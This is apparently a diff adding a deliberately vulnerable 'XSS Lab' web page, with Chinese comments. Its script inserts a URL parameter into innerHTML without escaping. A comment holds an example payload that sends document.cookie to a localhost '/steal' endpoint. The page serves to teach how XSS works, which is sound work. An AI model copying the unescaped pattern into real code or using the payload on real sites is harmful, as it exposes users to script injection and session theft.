@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>XSS Lab</title>
+</head>
+<body>
+  <h1>欢迎访问评论区</h1>
+
+  <form method="GET">
+    <input name="comment" placeholder="请输入评论">
+    <button type="submit">提交</button>
+  </form>
+
+  <div id="comments">
+    <p>用户评论：</p>
+    <div id="render-comment"></div>
+  </div>
+
+  <script>
+    const params = new URLSearchParams(location.search);
+    const comment = params.get('comment');
+    // 输入
+    // <img src=x onerror="fetch('http://localhost:3000/steal?cookie=' + encodeURIComponent(document.cookie))">
+    if (comment) {
+      // 👇 这里存在 XSS 漏洞，直接插入 HTML，没有做任何转义
+      document.getElementById('render-comment').innerHTML = comment;
+    }
+  </script>
+</body>
+</html>
